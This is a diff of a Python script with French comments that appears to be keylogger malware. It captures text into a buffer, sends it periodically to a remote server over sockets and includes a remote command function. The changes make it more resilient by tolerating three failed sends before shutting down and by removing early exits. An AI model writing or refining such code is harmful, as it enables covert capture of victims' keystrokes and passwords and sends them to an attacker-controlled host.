@@ -127,12 +127,13 @@ def scan_socket(port):
         if port:
             rsocket.connect((SRV, port))
         else:
-            rsocket.connect((SRV, PORT))   # À voir peut-être pas nécessaire
+            rsocket.connect((SRV, PORT))
 
         print("Connection établie ")
+        time_buffer = 0
     except TimeoutError:
         print("Echec de connection")
-        kill_all()
+
 
 
 def keylogger():
@@ -169,10 +170,10 @@ def send(data, port):
         client_socket.close()
     except Exception as e:
         print(f"Erreur lors de l'envoi : {e}")
-        kill_all()
+        #kill_all()
 
 
-# Fonction non utile
+
 def commands(cmd, port):
 
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -196,7 +197,7 @@ def chrono():
     En cas d'échec elle stop le script
     :return: Rien
     """
-
+    time_buffer = 0
     arg = argument()
     global TXT_GLOB
     while True:
@@ -214,10 +215,13 @@ def chrono():
                     send_t.start()
                     # print(TXT_GLOB)
                     TXT_GLOB = ""
+                    time_buffer = 0
                 if seconds == 600:
                     return 0
             except Exception as e:
                 print(f"Erreur lors de l'envoi : {e}")
+                time_buffer = time_buffer + 1
+            if time_buffer == 3 :
                 kill_all()
 
 
